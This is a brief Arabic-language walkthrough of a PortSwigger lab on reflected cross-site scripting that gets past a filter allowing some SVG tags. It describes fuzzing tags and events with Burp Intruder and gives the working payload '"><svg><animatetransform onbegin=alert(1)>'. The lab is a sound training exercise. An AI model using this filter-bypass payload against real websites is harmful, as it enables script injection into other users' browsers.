# Lab: Reflected XSS with some SVG markup allowed

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

- الفكره من الLab ده ان في firewall بيعمل فلتره لكل الpayload ماعدا بعض payload SVG
- هاتستخدم الintrouder علشان اطل انهوtag and event الموقع مش بيعرف يعمله فلتره

```bash
1. ده الي طلع معايا في الاخر 

2. <svg><animatetransform onbegin=alert(1)>

3. بس علشان يشتغل لازم في قفله قوس ناقصه 

4. "><svg><animatetransform onbegin=alert(1)>
```
